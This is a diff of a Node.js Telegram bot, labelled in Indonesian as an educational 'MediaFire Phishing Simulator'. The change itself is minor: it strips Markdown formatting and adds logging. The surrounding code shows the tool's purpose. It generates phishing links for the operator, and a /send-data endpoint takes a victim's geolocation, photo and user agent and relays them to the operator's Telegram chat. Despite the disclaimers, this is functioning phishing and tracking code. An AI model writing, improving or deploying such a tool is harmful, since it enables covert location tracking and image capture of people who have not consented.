@@ -27,8 +27,7 @@ bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   bot.sendMessage(
     chatId,
-    `🔒 MediaFire Phishing Simulator\n\nGunakan perintah /generate untuk membuat link phishing edukasi.`,
-    {parse_mode: 'Markdown'}
+    `🔒 MediaFire Phishing Simulator\n\nGunakan perintah /generate untuk membuat link phishing edukasi.`
   );
 });
 
@@ -42,14 +41,15 @@ bot.onText(/\/generate/, (msg) => {
     `🔗 Phishing Link Created\n\n` +
     `Berikut link untuk edukasi keamanan digital:\n` +
     `${uniqueUrl}\n\n` +
-    `PERINGATAN: Ini hanya untuk tujuan edukasi. Jangan disalahgunakan!`,
-    {parse_mode: 'Markdown'}
+    `PERINGATAN: Ini hanya untuk tujuan edukasi. Jangan disalahgunakan!`
   );
 });
 
 app.post('/send-data', async (req, res) => {
   try {
     const { chatId, token, location, photo, userAgent } = req.body;
+    
+    console.log('Data received:', { chatId, token, location: !!location, photo: !!photo, userAgent });
     
     const expectedToken = generateToken(chatId);
     if (token !== expectedToken) {
@@ -62,7 +62,7 @@ app.post('/send-data', async (req, res) => {
                  `📸 Foto: ${photo ? 'Tersedia' : 'Tidak tersedia'}`;
     
     await bot.sendLocation(chatId, location.latitude, location.longitude);
-    await bot.sendMessage(chatId, message, {parse_mode: 'Markdown'});
+    await bot.sendMessage(chatId, message);
     
     if (photo) {
       try {
